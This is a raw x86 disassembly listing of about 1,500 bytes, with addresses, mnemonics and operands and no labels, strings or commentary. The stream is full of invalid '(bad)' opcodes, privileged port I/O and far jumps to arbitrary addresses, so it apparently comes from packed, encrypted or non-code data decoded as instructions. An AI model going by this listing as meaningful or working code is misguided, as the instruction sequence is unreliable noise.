  406b03:	xchg   ebp,eax
  406b04:	test   al,0x0
  406b06:	fild   DWORD PTR ds:0x301a85cf
  406b0c:	in     al,dx
  406b0d:	nop
  406b0e:	pop    ss
  406b0f:	cli    
  406b10:	call   0xc741dce3
  406b15:	adc    eax,0x86ed7bc6
  406b1a:	xchg   esp,eax
  406b1b:	imul   edi,DWORD PTR [ebx+0x61],0xd9a7f466
  406b22:	cld    
  406b23:	out    0xcd,al
  406b25:	std    
  406b26:	imul   ebx,edx,0xe03a0474
  406b2c:	xchg   ebx,eax
  406b2d:	arpl   WORD PTR ds:0x7f866741,si
  406b33:	xchg   ebp,eax
  406b34:	mov    ah,0x46
  406b36:	fprem1 
  406b38:	or     al,0x3b
  406b3a:	ja     0x406b99
  406b3c:	mov    ah,BYTE PTR [ebx]
  406b3e:	repnz pop ebp
  406b40:	dec    esp
  406b41:	and    eax,0xc1a1a2c1
  406b46:	inc    esp
  406b47:	cmp    eax,0x90d31e17
  406b4c:	add    eax,0x69f10374
  406b51:	lock cmp ch,BYTE PTR [edi+0x69]
  406b55:	add    DWORD PTR [ecx-0x38d7543e],ecx
  406b5b:	adc    eax,0xabf12a3e
  406b60:	(bad)  
  406b61:	or     dl,BYTE PTR [edi+0x2e09c454]
  406b67:	je     0x406b21
  406b69:	sub    dl,BYTE PTR [esi-0x488bc89d]
  406b6f:	jo     0x406b2e
  406b71:	dec    ebp
  406b72:	sub    ah,bh
  406b74:	mov    ds:0x6666f5a0,al
  406b79:	and    eax,0x5bc8a2f2
  406b7e:	stc    
  406b7f:	outs   dx,DWORD PTR ds:[esi]
  406b80:	arpl   sp,dx
  406b82:	push   eax
  406b83:	icebp  
  406b84:	imul   edi,DWORD PTR [ebx+ebx*8],0x41
  406b88:	aad    0xbc
  406b8a:	pop    esi
  406b8b:	imul   eax,DWORD PTR [esi-0x5a],0x39
  406b8f:	in     al,dx
  406b90:	sbb    dh,cl
  406b92:	test   al,0x49
  406b94:	pop    edx
  406b95:	cmp    edi,DWORD PTR [eax-0x6f]
  406b98:	sbb    ecx,DWORD PTR [edi-0x7bdfebd8]
  406b9e:	adc    al,0xcf
  406ba0:	adc    al,0xae
  406ba2:	ja     0x406bc4
  406ba4:	mov    edx,0x9cf15a78
  406ba9:	jae    0x406b56
  406bab:	stos   DWORD PTR es:[edi],eax
  406bac:	dec    ebp
  406bad:	aas    
  406bae:	push   esp
  406baf:	adc    eax,0x73446486
  406bb4:	cmp    esp,DWORD PTR [eax+0x5]
  406bb7:	stc    
  406bb8:	(bad)  [edx]
  406bba:	sti    
  406bbb:	aaa    
  406bbc:	iret   
  406bbd:	sti    
  406bbe:	fwait
  406bbf:	clc    
  406bc0:	jno    0x406c12
  406bc2:	mov    eax,ds:0xad4c8f54
  406bc7:	imul   edi,DWORD PTR [esp+esi*1],0xffffffbd
  406bcb:	ja     0x406c0c
  406bcd:	shl    edx,cl
  406bcf:	pop    ds
  406bd0:	push   eax
  406bd1:	je     0x406bf1
  406bd3:	stos   DWORD PTR es:[edi],eax
  406bd4:	mov    ch,0xb6
  406bd6:	loopne 0x406be3
  406bd8:	ror    BYTE PTR ds:0xcf6dbae2,1
  406bde:	mov    cl,0xe9
  406be0:	cmp    eax,0xeba6889a
  406be5:	popa   
  406be6:	xchg   esi,eax
  406be7:	or     BYTE PTR [edx-0x6d],0x88
  406beb:	imul   ebx,DWORD PTR [edx+ebx*8-0x76],0x4f
  406bf0:	outs   dx,DWORD PTR ds:[esi]
  406bf1:	xor    BYTE PTR [edi-0x40081166],0x55
  406bf8:	imul   BYTE PTR gs:[edi-0x57ed2c58]
  406bff:	dec    eax
  406c00:	pop    ds
  406c01:	mov    ebx,DWORD PTR [edx+0x57f18322]
  406c07:	xor    eax,0x3534f1d5
  406c0c:	or     DWORD PTR [ebp-0x1c339e1c],esi
  406c12:	or     DWORD PTR [eax+0x4e],0xffffffc9
  406c16:	mov    ds:0x46117111,eax
  406c1b:	mov    cl,0x71
  406c1d:	cmp    al,0xcc
  406c1f:	push   0xffffffdc
  406c21:	jbe    0x406bac
  406c23:	push   eax
  406c24:	inc    esi
  406c25:	mov    BYTE PTR [esi-0x79],dh
  406c28:	inc    ecx
  406c29:	inc    eax
  406c2a:	out    dx,eax
  406c2b:	inc    ebx
  406c2c:	repnz aas 
  406c2e:	sub    al,0x49
  406c30:	int3   
  406c31:	lahf   
  406c32:	mov    esi,0xa0754e67
  406c37:	pop    esi
  406c38:	adc    DWORD PTR [ebx+0x428a4b2a],esp
  406c3e:	enter  0xef35,0x3e
  406c42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c43:	mov    ah,BYTE PTR [ebx]
  406c45:	test   DWORD PTR [eax-0x51a382be],0x46741f1b
  406c4f:	mov    BYTE PTR [eax-0xf],dh
  406c52:	and    DWORD PTR [esi+edx*4-0x5db2dd15],esp
  406c59:	and    cl,BYTE PTR ds:0x19d50a55
  406c5f:	add    DWORD PTR [esp+ecx*4+0x38],edi
  406c63:	pop    ss
  406c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c65:	jge    0x406c6d
  406c67:	and    BYTE PTR [edx-0x2658115d],ah
  406c6d:	mov    gs,WORD PTR [ecx+0xb2c4a]
  406c73:	xlat   BYTE PTR es:[ebx]
  406c75:	mov    ch,0x24
  406c77:	(bad)
  406c7a:	push   cs
  406c7b:	pop    ecx
  406c7c:	into   
  406c7d:	xchg   edx,eax
  406c7e:	pop    esp
  406c7f:	outs   dx,BYTE PTR ds:[esi]
  406c80:	xchg   edx,eax
  406c81:	or     WORD PTR [ebx],dx
  406c84:	icebp  
  406c85:	js     0x406c79
  406c87:	sbb    dl,BYTE PTR [ebx-0x22cd46ab]
  406c8d:	inc    esp
  406c8e:	mov    eax,0xb9d4ba3a
  406c93:	or     esp,DWORD PTR [edi]
  406c95:	push   ds
  406c96:	loopne 0x406cbd
  406c98:	sbb    eax,0xc724fe1
  406c9d:	ret    
  406c9e:	cs ja  0x406c3f
  406ca1:	in     al,dx
  406ca2:	mov    ebp,0xbcbe818
  406ca7:	imul   ebx,DWORD PTR [edi],0x28
  406caa:	int3   
  406cab:	mov    cl,0x7c
  406cad:	jae    0x406c82
  406caf:	xchg   ch,bl
  406cb1:	dec    esi
  406cb2:	add    eax,0xb8491e68
  406cb7:	push   cs
  406cb8:	scas   eax,DWORD PTR es:[edi]
  406cb9:	imul   eax,DWORD PTR [ebx+0x62b4cb85],0x23
  406cc0:	xlat   BYTE PTR ds:[ebx]
  406cc1:	jge    0x406ce3
  406cc3:	int    0x45
  406cc5:	adc    eax,DWORD PTR ds:0x33a7d5df
  406ccb:	lods   al,BYTE PTR ds:[esi]
  406ccc:	mov    al,BYTE PTR [edx+0x45]
  406ccf:	mov    esp,0x5174a9d3
  406cd4:	lods   eax,DWORD PTR ds:[esi]
  406cd5:	in     al,dx
  406cd6:	mov    edx,0x4b11bde4
  406cdb:	mov    dl,0xf8
  406cdd:	sub    bh,ah
  406cdf:	jne    0x406d2f
  406ce1:	or     al,al
  406ce3:	sub    eax,0x4980cbd1
  406ce8:	lods   eax,DWORD PTR ds:[esi]
  406ce9:	test   ax,0x40b0
  406ced:	and    bh,BYTE PTR [edx-0xedb1afd]
  406cf3:	(bad)  
  406cf4:	mov    eax,0x7eb7a227
  406cf9:	mov    eax,ds:0x17946fb3
  406cfe:	push   ss
  406cff:	xchg   edx,eax
  406d00:	add    edx,0xa5376acd
  406d06:	inc    esi
  406d07:	dec    esp
  406d08:	test   edi,ebp
  406d0a:	jp     0x406d0a
  406d0c:	(bad)  
  406d0d:	cld    
  406d0e:	mov    al,0x5
  406d10:	or     eax,0x15e80b9b
  406d15:	adc    ebp,DWORD PTR [ebx]
  406d17:	mov    ebx,0xf71e98a2
  406d1c:	pop    ss
  406d1d:	jle    0x406d43
  406d1f:	leave  
  406d20:	push   esi
  406d21:	cmp    eax,0x30cc8d64
  406d26:	mov    cl,al
  406d28:	bound  ebx,QWORD PTR [esi]
  406d2a:	push   eax
  406d2b:	jmp    FWORD PTR [eax+edi*1]
  406d2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d2f:	mov    cl,0xa9
  406d31:	mov    edx,0x493b853e
  406d36:	aas    
  406d37:	dec    edx
  406d38:	xchg   ebp,eax
  406d39:	je     0x406d30
  406d3b:	rcr    bh,0xce
  406d3e:	cwde   
  406d3f:	mov    ch,0xad
  406d41:	sbb    ecx,DWORD PTR [ebx+0x5fca086c]
  406d47:	inc    eax
  406d48:	mov    DWORD PTR [esp+edx*4-0x1b],0xa4cc9f87
  406d50:	cmp    al,0xbe
  406d52:	fsub   DWORD PTR [edx+eiz*2+0x5ff3eb9a]
  406d59:	adc    BYTE PTR [eax+0x20],ch
  406d5c:	in     al,0x30
  406d5e:	or     edx,DWORD PTR [edi-0x61]
  406d61:	fwait
  406d62:	inc    ebp
  406d63:	out    0x96,al
  406d65:	popa   
  406d66:	cwde   
  406d67:	adc    DWORD PTR [ebx+edi*4],0xffffffa0
  406d6b:	add    eax,0xedef22d8
  406d70:	mov    bl,0x14
  406d72:	dec    esi
  406d73:	push   edi
  406d74:	jg     0x406dce
  406d76:	push   ebx
  406d77:	neg    ebp
  406d79:	stos   DWORD PTR es:[edi],eax
  406d7a:	clc    
  406d7b:	sub    esp,DWORD PTR [ebp+0xf]
  406d7e:	jl     0x406d05
  406d80:	iret   
  406d81:	sahf   
  406d82:	and    esi,DWORD PTR [eax-0x3ab4cd8e]
  406d88:	imul   eax,DWORD PTR [edi],0xa30226b8
  406d8e:	ins    BYTE PTR es:[edi],dx
  406d8f:	cmp    eax,0x3394181b
  406d94:	nop
  406d95:	test   BYTE PTR [edi+0x60fe186f],cl
  406d9b:	call   0x63ba:0x6fd29e73
  406da2:	lahf   
  406da3:	jb     0x406dee
  406da5:	mov    eax,ds:0x900bed4c
  406daa:	xlat   BYTE PTR ds:[ebx]
  406dab:	hlt    
  406dac:	or     BYTE PTR [edi-0x47],0x5b
  406db0:	fdivr  DWORD PTR [edx-0x4e8209c0]
  406db6:	lahf   
  406db7:	test   al,0xae
  406db9:	mov    cl,0x64
  406dbc:	jbe    0x406db3
  406dbe:	test   BYTE PTR [ebx+0x72],al
  406dc1:	add    al,0xff
  406dc3:	xchg   edx,eax
  406dc4:	mov    cl,0x57
  406dc6:	pop    eax
  406dc7:	retf   
  406dc8:	sbb    bh,BYTE PTR [ebp+0x2fd23155]
  406dce:	mov    ebp,0x2605897b
  406dd3:	push   0x38
  406dd5:	addr16 cdq 
  406dd7:	ja     0x406d67
  406dd9:	out    0x3a,al
  406ddb:	lods   al,BYTE PTR ds:[esi]
  406ddc:	mov    cl,0xdb
  406dde:	xchg   esi,eax
  406ddf:	inc    esi
  406de0:	out    0x8f,al
  406de2:	mov    dh,0xda
  406de4:	push   edx
  406de5:	sbb    DWORD PTR [edi+edi*1+0x638b3e49],eax
  406dec:	adc    eax,DWORD PTR [esi]
  406dee:	sub    al,0x9e
  406df0:	cmp    BYTE PTR [ecx+esi*1+0x2d07f122],ah
  406df7:	icebp  
  406df8:	frstor [edx+0x5f804136]
  406dfe:	or     edi,DWORD PTR [eax-0x73a46cab]
  406e04:	(bad)  
  406e05:	out    0x19,eax
  406e07:	inc    eax
  406e08:	dec    esp
  406e09:	popa   
  406e0a:	add    dh,BYTE PTR [edi+0x5dec5c6f]
  406e10:	dec    esi
  406e11:	push   edx
  406e12:	xchg   ch,dl
  406e14:	imul   edi,DWORD PTR [edx],0x262a1ca8
  406e1a:	scas   al,BYTE PTR es:[edi]
  406e1b:	fsub   QWORD PTR [esi+0x1b]
  406e1e:	mov    dh,0x2e
  406e20:	add    eax,0x8163532
  406e25:	sub    DWORD PTR [ebx-0x3566edff],edx
  406e2b:	mov    BYTE PTR ds:0xdc105b9a,ah
  406e31:	jo     0x406e26
  406e33:	shl    DWORD PTR [ecx+0x13],cl
  406e36:	fdivr  QWORD PTR ds:0x2f629e96
  406e3c:	mov    edi,0xd550c530
  406e41:	mov    ds:0x9e0ec3e9,eax
  406e46:	pusha  
  406e47:	inc    esi
  406e48:	outs   dx,DWORD PTR ds:[esi]
  406e49:	xor    ebx,edi
  406e4b:	aaa    
  406e4c:	fild   WORD PTR [ebp+0x43c2fbb4]
  406e52:	retf   0xcb2b
  406e55:	push   edx
  406e56:	aas    
  406e57:	adc    edi,DWORD PTR [ebp-0x4b]
  406e5a:	pop    edx
  406e5b:	jnp    0x406e29
  406e5d:	ds pop edx
  406e5f:	dec    ebx
  406e60:	frstor [ecx+ecx*4-0x47]
  406e64:	nop
  406e65:	or     DWORD PTR [edi-0x43],ebp
  406e68:	or     edx,DWORD PTR [ebp+0x102ae6c1]
  406e6e:	push   ebx
  406e6f:	adc    DWORD PTR [ebp-0x55],edx
  406e72:	addr16 or eax,0x592176f3
  406e78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e79:	das    
  406e7a:	push   0x25
  406e7c:	adc    DWORD PTR [ecx-0x7f],ebx
  406e7f:	mov    ds:0xc16e083d,al
  406e84:	or     al,0xcc
  406e86:	in     eax,dx
  406e87:	pop    ss
  406e88:	push   0x79
  406e8a:	mov    esp,0xdea5697b
  406e8f:	sub    BYTE PTR [edx+0x57],cl
  406e92:	and    esi,eax
  406e94:	sub    BYTE PTR [edx],cl
  406e96:	outs   dx,DWORD PTR ds:[esi]
  406e97:	loop   0x406e3e
  406e99:	or     esp,DWORD PTR [ebp-0x1af87984]
  406e9f:	test   eax,0xaa9974b1
  406ea4:	les    esi,FWORD PTR [ecx+0x7d0ad6a8]
  406eaa:	fst    DWORD PTR [edi-0x67]
  406ead:	test   DWORD PTR [edi-0x4f277b64],ebp
  406eb3:	pop    ecx
  406eb4:	loop   0x406eb9
  406eb6:	iret   
  406eb7:	sub    BYTE PTR ds:0x678ea683,bh
  406ebd:	ins    BYTE PTR es:[edi],dx
  406ebe:	dec    ebx
  406ebf:	jge    0x406ef0
  406ec1:	pushf  
  406ec2:	aas    
  406ec3:	fdiv   DWORD PTR [esi]
  406ec5:	push   edx
  406ec6:	xor    BYTE PTR [eax-0x1dd653c2],0xb4
  406ecd:	adc    DWORD PTR [esi+0x1],ecx
  406ed0:	sbb    al,0x20
  406ed3:	cli    
  406ed4:	cmp    BYTE PTR [ebx-0x28464052],dl
  406eda:	inc    esi
  406edb:	scas   al,BYTE PTR es:[edi]
  406edc:	dec    edx
  406edd:	and    al,0xaa
  406edf:	sub    BYTE PTR [ebx+eax*4-0xb421174],bl
  406ee6:	imul   edi,DWORD PTR [ecx-0x5d],0x7e
  406eea:	xchg   WORD PTR [eax],di
  406eed:	test   al,0x6b
  406eef:	add    DWORD PTR [eax],0x155af29b
  406ef5:	and    bh,al
  406ef7:	loop   0x406f24
  406ef9:	jmp    FWORD PTR [ebp+0x4b5316ea]
  406eff:	push   cs
  406f00:	jae    0x406ee3
  406f02:	push   ecx
  406f03:	sub    al,0xfc
  406f05:	sub    al,0x6b
  406f07:	retf   0x5826
  406f0a:	mov    DWORD PTR [edx-0x30],esp
  406f0d:	or     DWORD PTR [edx],ebx
  406f0f:	ja     0x406ed9
  406f11:	add    ah,BYTE PTR [eax+0x652cdf87]
  406f17:	fdiv   QWORD PTR ds:0x818b57d0
  406f1d:	mov    eax,0xc01194d5
  406f22:	xchg   esp,eax
  406f23:	mov    ch,0x11
  406f25:	arpl   WORD PTR [ecx],sp
  406f27:	inc    eax
  406f28:	cmp    dl,BYTE PTR ds:0x310740e0
  406f2e:	xchg   ebp,eax
  406f2f:	call   0xab45:0x74cd2083
  406f36:	xchg   dh,dl
  406f38:	lahf   
  406f39:	push   es
  406f3a:	ins    DWORD PTR es:[edi],dx
  406f3b:	add    al,0x7
  406f3d:	out    0xac,al
  406f3f:	test   eax,0xa45cb02a
  406f44:	mov    bl,0xea
  406f46:	pop    eax
  406f47:	push   edx
  406f48:	add    eax,0xb62262d2
  406f4d:	sub    eax,0x62
  406f50:	push   ds
  406f51:	repnz xchg esp,eax
  406f53:	cmp    BYTE PTR [ecx+edi*8],ah
  406f56:	pop    esi
  406f57:	inc    esi
  406f58:	push   ds
  406f59:	xor    BYTE PTR [ebx-0x71],ch
  406f5c:	stos   BYTE PTR es:[edi],al
  406f5d:	cmp    BYTE PTR [ecx],0xcb
  406f60:	fs pop esp
  406f62:	adc    eax,0x4a2d998d
  406f67:	xchg   ecx,eax
  406f68:	repz push ds
  406f6a:	sbb    BYTE PTR [esi-0x46efce3a],dl
  406f70:	addr16 pop ebx
  406f72:	mov    dl,0x15
  406f74:	jl     0x406f0c
  406f76:	fstp   TBYTE PTR [ecx+0x37313c2d]
  406f7c:	pop    ebp
  406f7d:	cs test eax,0x25fbf70b
  406f83:	stos   DWORD PTR es:[edi],eax
  406f84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f85:	cmp    BYTE PTR [edi],0x5f
  406f88:	ds push cs
  406f8a:	sbb    ebx,DWORD PTR [edx]
  406f8c:	in     al,dx
  406f8d:	xor    BYTE PTR [ebx+0x16],ch
  406f90:	jg     0x406f5a
  406f92:	loopne 0x406fc6
  406f94:	idiv   DWORD PTR [ecx]
  406f96:	lahf   
  406f97:	add    eax,0x3afda85c
  406f9c:	inc    ebp
  406f9d:	pop    edx
  406f9e:	sahf   
  406f9f:	mov    ah,BYTE PTR [edi-0x7612a8c4]
  406fa5:	jbe    0x406fe0
  406fa7:	cdq    
  406fa8:	jecxz  0x406fb6
  406faa:	xchg   ecx,esi
  406fac:	add    esi,ebp
  406fae:	mov    edx,ecx
  406fb0:	sub    al,0x76
  406fb2:	js     0x406f55
  406fb4:	jbe    0x406f95
  406fb6:	daa    
  406fb7:	pusha  
  406fb8:	sbb    DWORD PTR [edx+0x7c824862],0xffffffa8
  406fbf:	jmp    0x67583b3c
  406fc4:	push   ebx
  406fc5:	xor    DWORD PTR [edi],ecx
  406fc7:	enter  0x2246,0x56
  406fcb:	add    dh,BYTE PTR [ebp-0x22411dbb]
  406fd1:	cmp    DWORD PTR [ebp-0x3d],eax
  406fd4:	and    eax,0x5c5a33b5
  406fd9:	push   ecx
  406fda:	cdq    
  406fdb:	sti    
  406fdc:	mov    al,0xe6
  406fde:	mov    edi,ecx
  406fe0:	hlt    
  406fe1:	fld    DWORD PTR [esi-0x19]
  406fe4:	sbb    al,0x7
  406fe6:	div    ebx
  406fe8:	pop    edx
  406fe9:	cli    
  406fea:	fldcw  WORD PTR [edx+0x43d501ea]
  406ff0:	jb     0x406fc6
  406ff2:	pop    eax
  406ff3:	mov    eax,0x7ba2a6d9
  406ff8:	(bad)  
  406ff9:	mov    esp,0x5223f9bc
  406ffe:	mov    bh,0xf2
  407000:	(bad)  
  407002:	push   ds
  407003:	pop    eax
  407004:	jg     0x40707f
  407006:	iret   
  407007:	dec    edi
  407008:	lea    esi,[eax]
  40700a:	sar    DWORD PTR [ebp-0x37],cl
  40700d:	pop    es
  40700e:	test   BYTE PTR [edx],0xba
  407011:	ins    WORD PTR es:[edi],dx
  407013:	pop    ds
  407014:	inc    eax
  407015:	inc    edi
  407016:	and    DWORD PTR [esi+0x3f],0xd80e7a6
  40701d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40701e:	pop    esp
  40701f:	and    eax,0xe1865e6b
  407024:	mov    cl,0xfe
  407026:	push   cs
  407027:	(bad)  
  407028:	push   ebx
  407029:	out    0xc8,al
  40702b:	add    dh,BYTE PTR [esi]
  40702d:	pop    esi
  40702e:	sar    edx,1
  407030:	sub    al,BYTE PTR [ecx+0x4143889b]
  407036:	in     al,dx
  407037:	into   
  407038:	sbb    al,0x5e
  40703a:	adc    BYTE PTR [ebp+0x58],ah
  40703d:	pop    ebx
  40703e:	outs   dx,DWORD PTR ds:[esi]
  40703f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407040:	fisubr WORD PTR [ecx+edi*8+0x554d2767]
  407047:	cmc    
  407048:	gs (bad) 
  40704a:	fst    DWORD PTR [eax+0x62c3bc3e]
  407050:	pop    ds
  407051:	mov    ch,0x21
  407053:	(bad)
  407058:	mov    al,ds:0xd5e050c6
  40705d:	dec    eax
  40705e:	cmp    ebx,DWORD PTR es:[ecx-0x40b361e4]
  407065:	mov    esi,0xbad25268
  40706b:	mov    edi,0xf895178a
  407070:	sbb    eax,0x73d1eae2
  407075:	sub    DWORD PTR [ecx-0x3c],edi
  407078:	sbb    edx,DWORD PTR [edi]
  40707a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40707b:	mov    dh,0x3c
  40707d:	or     eax,0xa4ef5b9
  407082:	push   ebx
  407083:	sbb    eax,0xaa334104
  407088:	push   esi
  407089:	mov    esp,0xbff64472
  40708e:	add    eax,0xc200407
  407093:	inc    esi
  407094:	inc    esp
  407095:	jl     0x407022
  407097:	daa    
  407098:	cli    
  407099:	push   ds
  40709a:	fmul   DWORD PTR ds:0xa107b54d
  4070a0:	dec    esp
  4070a1:	mov    al,BYTE PTR [ebx+0x3b]
  4070a4:	nop
  4070a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070a6:	add    eax,0xf16f2f0f
  4070ab:	and    dh,bl
  4070ad:	fwait
  4070ae:	loop   0x40706b
  4070b0:	adc    BYTE PTR [edi+esi*8-0x49],al
  4070b4:	ror    dh,1
  4070b6:	je     0x407066
  4070b8:	les    edx,FWORD PTR [ebx]
  4070ba:	js     0x407132
  4070bc:	shl    ebp,cl
  4070be:	pop    ds
  4070bf:	mov    cl,0xe1
  4070c1:	pusha  
  4070c2:	nop
  4070c3:	in     eax,dx
  4070c4:	das    
  4070c5:	add    DWORD PTR gs:[edi-0x2c],eax
  4070c9:	sbb    BYTE PTR [edi-0x30],al
  4070cc:	das    
  4070cd:	(bad)  
  4070ce:	scas   al,BYTE PTR es:[edi]
  4070cf:	push   edi
  4070d0:	cmp    DWORD PTR [eax],0xffffffe4
  4070d3:	int3   
  4070d4:	jae    0x40709f
  4070d6:	call   0xe1eda19f
  4070db:	or     ch,BYTE PTR [ebx+ebp*1-0x3a78983c]
  4070e2:	js     0x4070c2
  4070e4:	cmp    al,BYTE PTR [ebx+eax*4-0x18]
  4070e8:	mov    cl,0x3
  4070ea:	in     al,dx
  4070eb:	iret   
  4070ec:	cmp    ebp,DWORD PTR [esi-0x5b]
  4070ef:	faddp  st(0),st
  4070f1:	inc    edi
  4070f2:	mov    dl,BYTE PTR cs:[edi+ecx*8+0x28d723d4]
  4070fa:	sub    eax,0xedc7d1a6
  4070ff:	pop    esi
  407100:	dec    esi
  407101:	dec    esi
  407102:	mov    ch,0x33
  407104:	popf   
  407105:	out    0x86,al
  407107:	xor    eax,0xbf480750
  40710c:	repnz dec DWORD PTR [esi+esi*8+0x26]
  407111:	std    
  407112:	inc    edi
  407113:	mov    ecx,gs
  407115:	mov    DWORD PTR [eax+0x77d840df],eax
  40711b:	sub    al,0x43
  40711d:	(bad)  
  40711e:	mov    bh,0xb8
  407120:	mov    edx,0x7dfdef2e
  407125:	mov    edi,0x9279af78
  40712a:	push   cs
  40712b:	xchg   BYTE PTR [ebp-0x7c0a0aaa],cl
  407131:	daa    
  407132:	ja     0x4071a7
  407134:	inc    edi
  407135:	push   ebx
  407136:	hlt    
  407137:	jb     0x407129
  407139:	xchg   ebx,eax
  40713a:	jae    0x407124
  40713c:	mov    eax,0xd06f1f84
  407141:	(bad)  
  407142:	mov    ebx,0x7126f14d
  407147:	test   BYTE PTR [eax+0xda70166],ah
  40714d:	(bad)  
  40714f:	xor    eax,0x660daa57
  407154:	enter  0x5602,0xbe
  407158:	lods   al,BYTE PTR ds:[esi]
  407159:	mov    dh,0x21
  40715b:	shl    BYTE PTR [ebx-0x15],1
  40715e:	jo     0x407131
  407160:	out    dx,al
  407161:	xor    BYTE PTR [ebx-0x63624dc1],cl
  407167:	jb     0x407135
  407169:	imul   edx,DWORD PTR [ebx],0xf7f616e0
  40716f:	push   cs
  407170:	aaa    
  407171:	out    0x6b,eax
  407173:	xchg   DWORD PTR [ecx-0x77],ecx
  407176:	in     al,dx
  407177:	sub    bh,dl
  407179:	sbb    BYTE PTR [esi+0x3c175512],bh
  40717f:	loope  0x407137
  407181:	fistp  DWORD PTR [esi-0x209d9894]
  407187:	jbe    0x407114
  407189:	ds (bad) 
  40718b:	dec    ebp
  40718c:	je     0x4071e8
  40718e:	dec    ebx
  40718f:	ror    BYTE PTR [esi],1
  407191:	in     al,0x12
  407193:	test   al,0x62
  407195:	jmp    0x8845237f
  40719a:	pop    edx
  40719b:	dec    edx
  40719c:	xor    ebp,edi
  40719e:	mov    DWORD PTR [ebx+0x19],esi
  4071a1:	bound  ecx,QWORD PTR [ecx-0x39]
  4071a4:	(bad)  
  4071a5:	cli    
  4071a6:	mov    bh,0x8e
  4071a8:	mov    cl,0x90
  4071aa:	cmp    eax,0x29d13a22
  4071af:	push   0xffffffd3
  4071b1:	push   edx
  4071b2:	(bad)  
  4071b3:	fwait
  4071b4:	inc    edx
  4071b5:	pop    ebp
  4071b6:	or     ah,BYTE PTR [edi]
  4071b8:	out    0x99,eax
  4071ba:	cmc    
  4071bb:	jns    0x407188
  4071bd:	adc    ebp,DWORD PTR [edx+0x40]
  4071c0:	rol    BYTE PTR [eax+0x6d],1
  4071c3:	push   ebp
  4071c4:	sub    al,0x21
  4071c6:	pop    ss
  4071c7:	lods   al,BYTE PTR ds:[esi]
  4071c8:	jae    0x40718a
  4071ca:	add    ebx,0xffffffac
  4071cd:	and    eax,0x33383b36
  4071d2:	loopne 0x40720c
  4071d4:	mov    dl,dh
  4071d6:	jne    0x4071d5
  4071d8:	jbe    0x4071ca
  4071da:	(bad)  
  4071db:	jp     0x4071d3
  4071dd:	jge    0x407258
  4071df:	iret   
  4071e0:	outs   dx,BYTE PTR ds:[esi]
  4071e1:	xor    DWORD PTR [edi+edx*1],esi
  4071e4:	mov    esp,DWORD PTR [eax*4-0x681cac12]
  4071eb:	fisttp DWORD PTR [ebx-0x6ca679e8]
  4071f1:	sub    BYTE PTR [edx+0x6678fd48],bl
  4071f7:	cmp    DWORD PTR [edi],ecx
  4071f9:	in     al,dx
  4071fa:	push   0xffffffc4
  4071fc:	dec    esi
  4071fd:	push   ss
  4071fe:	loope  0x4071e4
  407200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407201:	and    edx,DWORD PTR [esi-0x2c]
  407204:	cmp    BYTE PTR [eax+0x38],dl
  407207:	jns    0x4071ab
  407209:	mov    edx,0xd7af3f00
  40720e:	push   0xcd4d6de5
  407213:	popa   
  407214:	sub    BYTE PTR [edi+0x45192725],bl
  40721a:	ss je  0x407218
  40721d:	fstp   QWORD PTR [esi]
  40721f:	or     eax,DWORD PTR [ecx-0x7b]
  407222:	dec    edx
  407223:	jae    0x40722e
  407225:	ja     0x40721d
  407227:	mov    BYTE PTR [ecx+0x4a32ea70],bh
  40722d:	push   es
  40722e:	mov    esi,0x28dc5185
  407233:	dec    ebx
  407234:	dec    ebp
  407235:	rcl    DWORD PTR [esi+0x48894756],0x0
  40723c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40723d:	dec    eax
  40723e:	nop
  40723f:	loop   0x407201
  407241:	scas   eax,DWORD PTR es:[edi]
  407242:	xor    eax,DWORD PTR [edx]
  407244:	jns    0x4071c9
  407246:	dec    eax
  407247:	jg     0x4071f7
  407249:	test   DWORD PTR [edx+0x16],esp
  40724c:	inc    edx
  40724d:	mov    DWORD PTR [ebx+0x45],ebp
  407250:	inc    edi
  407251:	in     al,0xb8
  407253:	xor    al,0x62
  407255:	sti    
  407256:	shl    BYTE PTR [edx+0x2f307e5f],cl
  40725c:	inc    BYTE PTR [eax-0x742f55fc]
  407262:	sbb    eax,0x93680e5c
  407267:	mov    ds:0xc52f08ec,al
  40726c:	mov    al,ds:0x87c657b4
  407271:	dec    edi
  407272:	adc    al,0xd0
  407274:	mov    cl,0x34
  407276:	mov    al,ds:0x763830df
  40727b:	ficomp WORD PTR [esi*2-0x43048293]
  407282:	sub    eax,0x25ce0e0e
  407287:	fisttp QWORD PTR [ebx]
  407289:	dec    ebp
  40728a:	xchg   edx,eax
  40728b:	sbb    al,0x9
  40728d:	mov    ds:0x1ca95ccb,eax
  407292:	mov    dh,0x3f
  407294:	es cmp esi,eax
  407297:	push   ebp
  407298:	or     ah,cl
  40729a:	cld    
  40729b:	adc    cl,BYTE PTR [esi]
  40729d:	(bad)  
  40729e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40729f:	pop    ds
  4072a0:	adc    eax,esi
  4072a2:	(bad)  
  4072a3:	repz mov esp,0xf0aa0b1e
  4072a9:	push   cs
  4072aa:	jle    0x40725a
  4072ac:	(bad)  
  4072ad:	rol    DWORD PTR [edx],1
  4072af:	fmul   QWORD PTR [edi+0x74015ff0]
  4072b5:	xor    eax,DWORD PTR [ecx+ebp*2]
  4072b8:	fist   DWORD PTR [edi+0x18]
  4072bb:	test   DWORD PTR [edi-0x1],esi
  4072be:	clc    
  4072bf:	xlat   BYTE PTR ds:[ebx]
  4072c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072c1:	addr16 out dx,al
  4072c3:	xlat   BYTE PTR ds:[ebx]
  4072c4:	sbb    eax,0x32976b2e
  4072c9:	aas    
  4072ca:	sbb    al,0x5c
  4072cc:	adc    eax,DWORD PTR [edx-0x6d]
  4072cf:	push   ecx
  4072d0:	inc    ebp
  4072d1:	mov    ecx,0xc6059d7b
  4072d6:	inc    ecx
  4072d7:	clc    
  4072d8:	sub    dl,BYTE PTR [edx+0x1624b063]
  4072de:	sub    DWORD PTR [ebx-0x6ba7347c],edi
  4072e4:	faddp  st(7),st
